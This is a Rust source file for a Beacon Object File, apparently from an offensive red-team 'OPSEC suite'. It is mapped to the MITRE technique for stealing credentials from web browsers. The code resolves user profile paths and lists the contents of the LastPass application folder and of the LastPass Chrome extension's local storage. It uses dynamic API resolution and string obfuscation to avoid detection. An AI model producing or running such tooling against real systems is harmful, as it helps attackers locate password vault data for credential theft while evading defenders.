// SPDX-FileCopyrightText: 2026 Dani <daniagungg@gmail.com>
// SPDX-License-Identifier: MIT
// Project: DEF-Situational-Awareness-BOF — Dani RustBOF OPSEC Suite
// Credit: Rust port + OPSEC hardening
//
//! Locate LastPass browser extension local storage.
//! Args: none
#![no_std]
#![cfg_attr(not(test), no_main)]

use rustbof::{println, eprintln};
use common::{mitre::Technique, dfr_fn, obf};

const TECHNIQUES: &[Technique] = &[
    Technique { id: "T1555.003", name: "Credentials from Web Browsers", tactic: "Credential Access" },
];

const CSIDL_LOCAL_APPDATA: i32  = 0x001c;
const CSIDL_APPDATA:       i32  = 0x001A;
const MAX_PATH:           usize = 260;
const INVALID_HANDLE:     usize = !0usize;

const FIND_DATA_SIZE:     usize = 320;
const FIND_DATA_NAME_OFF: usize = 44;

dfr_fn!(
    sh_get_folder_path_a(hwnd: usize, csidl: i32, token: usize, flags: u32, path: *mut u8) -> i32,
    module = "shell32.dll",
    api    = "SHGetFolderPathA"
);
dfr_fn!(
    find_first_file_a(pattern: *const i8, data: *mut u8) -> usize,
    module = "kernel32.dll",
    api    = "FindFirstFileA"
);
dfr_fn!(
    find_next_file_a(handle: usize, data: *mut u8) -> i32,
    module = "kernel32.dll",
    api    = "FindNextFileA"
);
dfr_fn!(
    find_close(handle: usize) -> i32,
    module = "kernel32.dll",
    api    = "FindClose"
);

fn strlen(buf: &[u8]) -> usize {
    buf.iter().position(|&b| b == 0).unwrap_or(buf.len())
}

fn enumerate_dir(base: &[u8], suffix: &[u8], label: &str) {
    let base_len = strlen(base);
    let mut pattern = [0u8; MAX_PATH + 128];
    if base_len + suffix.len() + 3 >= pattern.len() { return; }
    pattern[..base_len].copy_from_slice(&base[..base_len]);
    pattern[base_len..base_len + suffix.len()].copy_from_slice(suffix);
    let pat_end = base_len + suffix.len();
    pattern[pat_end..pat_end + 2].copy_from_slice(b"\\*");

    let mut find_data = [0u8; FIND_DATA_SIZE];
    let hfind = match unsafe { find_first_file_a(pattern.as_ptr() as *const i8, find_data.as_mut_ptr()) } {
        Ok(h) => h,
        Err(_) => return,
    };
    if hfind == 0 || hfind == INVALID_HANDLE {
        return;
    }

    println!("  [{}]", label);
    loop {
        let name = &find_data[FIND_DATA_NAME_OFF..FIND_DATA_NAME_OFF + 260];
        let name_len = strlen(name);
        if name_len > 0 && !(name_len == 1 && name[0] == b'.') && !(name_len == 2 && &name[..2] == b"..") {
            let name_s = core::str::from_utf8(&name[..name_len]).unwrap_or("?");
            let dir_s  = core::str::from_utf8(&pattern[..pat_end]).unwrap_or("?");
            println!("    {}\\{}", dir_s, name_s);
        }
        find_data = [0u8; FIND_DATA_SIZE];
        let rc = unsafe { find_next_file_a(hfind, find_data.as_mut_ptr()) };
        if rc.unwrap_or(0) == 0 { break; }
    }
    unsafe { let _ = find_close(hfind); };
}

#[rustbof::main]
fn main(args: *mut u8, _len: usize) {
    let _ = args;
    common::mitre::print_banner(env!("CARGO_PKG_NAME"), TECHNIQUES);
    match run() {
        Ok(()) => {},
        Err(e) => eprintln!("[!] {}: {}", env!("CARGO_PKG_NAME"), e),
    }
}

fn run() -> Result<(), &'static str> {
    let mut appdata       = [0u8; MAX_PATH + 1];
    let mut local_appdata = [0u8; MAX_PATH + 1];

    unsafe {
        sh_get_folder_path_a(0, CSIDL_APPDATA, 0, 0, appdata.as_mut_ptr())
    }.map_err(|_| "path resolve")?;
    unsafe {
        sh_get_folder_path_a(0, CSIDL_LOCAL_APPDATA, 0, 0, local_appdata.as_mut_ptr())
    }.map_err(|_| "path resolve")?;

    obf! { let hdr = "LastPass storage"; }
    println!("[*] {}:", hdr);

    // %APPDATA%\LastPass
    enumerate_dir(&appdata, b"\\LastPass", "AppData LastPass");
    // Chrome extension: %LOCALAPPDATA%\Google\Chrome\User Data\Default\Local Extension Settings\hdokiejnpimakedhajhdlcegeplioahd
    enumerate_dir(
        &local_appdata,
        b"\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\hdokiejnpimakedhajhdlcegeplioahd",
        "Chrome LastPass extension"
    );

    obf! { let ok = "scan done"; }
    println!("[+] {}", ok);
    Ok(())
}
